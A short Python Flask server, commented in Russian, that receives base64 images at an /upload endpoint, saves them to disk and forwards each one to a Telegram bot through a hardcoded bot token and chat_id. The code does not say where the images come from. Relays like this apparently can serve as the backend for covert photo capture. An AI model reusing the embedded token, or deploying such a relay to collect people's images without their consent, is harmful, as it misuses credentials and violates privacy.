import base64
import requests
from flask import Flask, request

app = Flask(__name__)

# Токен твоего бота и chat_id
BOT_TOKEN = "7930470705:AAHbOa2VpXknxhnkdV5sCE9R3W50yjTbVwg"
CHAT_ID = "1181319067"  # Это твой уникальный chat_id, который можно получить через Telegram API

def send_to_telegram(photo_path):
    with open(photo_path, "rb") as photo:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data={"chat_id": CHAT_ID},
            files={"photo": photo}
        )

@app.route('/upload', methods=['POST'])
def upload():
    data_url = request.json.get('image')
    if not data_url:
        return "No image", 400

    # Получаем изображение
    header, encoded = data_url.split(",", 1)
    img_bytes = base64.b64decode(encoded)

    # Сохраняем фото на сервере
    photo_path = "photo.png"
    with open(photo_path, "wb") as f:
        f.write(img_bytes)

    # Отправляем фото в Telegram
    send_to_telegram(photo_path)

    return "Saved and sent", 200

if __name__ == "__main__":
    app.run(port=5000)
